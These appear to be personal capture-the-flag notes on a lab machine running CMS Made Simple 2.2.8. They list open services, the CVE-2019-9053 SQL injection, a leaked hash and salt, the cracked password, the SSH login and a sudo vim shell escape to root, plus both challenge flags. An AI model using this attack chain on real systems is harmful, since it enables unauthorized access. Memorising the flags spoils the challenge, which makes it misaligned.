ftp anon vsFTPd 3.0.3
http Apache httpd 2.4.18 ((Ubuntu)) http-robots.txt: 2 disallowed entries /openemr-5_0_1_3 
ssh 2222 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

dirs:
/simple

tech:
CMS Made Simple version 2.2.8
php

users:
mitch (root) NOPASSWD: /usr/bin/vim
sunbath

vulnerable to slqi CVE-2019-9053

email: admin@admin.com
pass: 0c01f4468bd75d7a84c7eb73846e8d96 MD5 or MD4
user: mitch
salt: 1dac0d92e9fa6bb2 LM or MySQL < version 4.1

cracked psw: secret

ssh -p 2222 mitch@ip psw: secret
user.txt - G00d j0b, keep up!

priv esc to root - sudo vim, ESC :!bash ENTER
root.txt - W3ll d0n3. You made it!
